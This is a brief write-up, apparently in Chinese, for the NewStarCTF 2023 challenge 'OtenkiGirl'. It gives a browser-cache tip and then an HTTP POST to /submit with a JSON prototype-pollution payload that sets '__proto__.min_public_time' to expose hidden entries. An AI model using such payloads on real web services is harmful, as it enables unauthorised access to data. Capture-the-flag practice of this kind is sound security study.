NewStarCTF 2023 Week3 OtenkiGirl

刷新网页时没新数据 -- nodejs缓存问题: 开发者工具 -> 应用程序 -> 存储中清除网站数据然后刷新网页即可。


```js
POST /submit HTTP/1.1
Content-Type: application/json

{
  "contact": "test",
  "reason": "test",
  "__proto__": {
    "min_public_time": "1001-01-01"
  }
}
```